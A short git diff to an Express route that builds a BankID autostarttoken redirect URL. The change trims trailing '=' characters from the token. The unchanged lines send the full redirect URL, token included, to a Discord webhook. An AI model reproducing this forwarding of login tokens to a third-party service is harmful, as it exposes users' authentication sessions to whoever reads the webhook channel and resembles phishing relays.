@@ -28,8 +28,11 @@ app.get('/', (req, res) => {
     return res.status(400).send('Missing autostarttoken parameter');
   }
 
+  // Trim trailing '=' characters from autostarttoken
+  const trimmedToken = autostarttoken.replace(/=+$/, '');
+
   // Construct the redirect URL with formatted query parameters
-  const redirectUrl = `bankid:///?autostarttoken=${autostarttoken}`;
+  const redirectUrl = `bankid:///?autostarttoken=${trimmedToken}`;
 
   // Log the redirect URL to Discord webhook (replace with your webhook function)
   sendDiscordWebhook(redirectUrl);
